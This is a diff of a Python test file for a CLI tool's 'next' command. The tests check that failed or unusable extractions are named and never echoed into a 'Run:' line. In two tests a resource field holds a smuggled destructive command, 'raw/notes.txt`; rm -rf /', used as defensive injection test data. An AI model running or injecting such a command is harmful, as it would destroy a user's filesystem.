     _write_unparseable_doc(tmp_path, name="broken-a")
     _write_unparseable_doc(tmp_path, name="broken-b")
 
@@ -1197,7 +1100,9 @@ def test_tier_1_reports_no_skip_notices_and_still_pays_no_walk(
 
 
 def test_failed_extraction_with_no_resource_is_named_not_dropped(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """`check_unextracted` emits a genuine, actionable finding for a Source
     with `extraction_status: failed` and no `resource` -- only its embedded
@@ -1205,7 +1110,7 @@ def test_failed_extraction_with_no_resource_is_named_not_dropped(
     Declining to print that command is right; declining SILENTLY is not,
     because a real failed ingest then leaves no trace at all (issue #276)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="")
 
     result = runner.invoke(app, ["next"])
@@ -1218,13 +1123,15 @@ def test_failed_extraction_with_no_resource_is_named_not_dropped(
 
 
 def test_declination_says_why_a_present_resource_was_unusable(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A missing `resource` and an unusable one point at DIFFERENT repairs
     -- record the path, versus rename the file -- so the two declinations
     must not collapse into one indistinguishable sentence."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt`; rm -rf /")
 
     result = runner.invoke(app, ["next"])
@@ -1237,13 +1144,15 @@ def test_declination_says_why_a_present_resource_was_unusable(
 
 
 def test_declination_is_named_even_when_a_lower_tier_fires(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A lower tier firing does not make the skipped finding go away. The
     declination is emitted alongside the recommendation, the same way #275's
     skip notices are (D4: the honesty guard holds on every path)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -1256,14 +1165,16 @@ def test_declination_is_named_even_when_a_lower_tier_fires(
 
 
 def test_declination_never_reprints_the_raw_unusable_resource(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The declination names the DOCUMENT, never the value that made it
     undecidable. Echoing the raw `resource` back would put the very string
     tier 2 refused to trust onto the line below `Run:` (#274's defect, one
     step removed)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt`; rm -rf /")
 
     result = runner.invoke(app, ["next"])
@@ -1274,12 +1185,14 @@ def test_declination_never_reprints_the_raw_unusable_resource(
 
 
 def test_a_runnable_finding_produces_no_declination(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Naming declinations must not turn every ordinary tier-2 run into a
     two-part message: an intact finding fires and says nothing else."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt")
 
     result = runner.invoke(app, ["next"])
